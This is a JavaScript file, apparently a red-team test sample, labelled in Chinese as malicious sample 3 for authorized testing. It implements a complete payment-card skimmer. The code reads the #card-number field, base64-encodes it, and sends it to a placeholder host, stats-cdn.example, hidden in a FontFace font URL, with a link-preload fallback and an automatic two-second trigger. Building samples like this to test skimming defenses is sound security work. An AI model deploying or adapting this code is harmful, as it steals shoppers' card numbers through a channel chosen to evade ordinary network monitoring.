/**
 * ⚠️ 恶意样本 3（授权红队测试用）：字体请求外发
 *
 * 把卡号编码进字体 URL，通过 FontFace 加载外发 ——
 * 传统只盯 fetch/XHR 的防护看不到字体通道。
 */
(function () {
  const EVIL_FONT = 'https://stats-cdn.example/fonts/payload.woff2';

  function steal() {
    const card = document.querySelector('#card-number');
    if (!card || !card.value) return;
    const encoded = btoa(unescape(encodeURIComponent(card.value)));
    try {
      const face = new FontFace(
        'InjectedSans',
        `url("${EVIL_FONT}?d=${encoded}") format("woff2")`,
      );
      face.load().catch(() => undefined);
    } catch {
      // 兜底：link preload 字体
      const link = document.createElement('link');
      link.rel = 'preload';
      link.as = 'font';
      link.href = `${EVIL_FONT}?d=${encoded}`;
      document.head.appendChild(link);
    }
  }

  setTimeout(steal, 2000);
})();
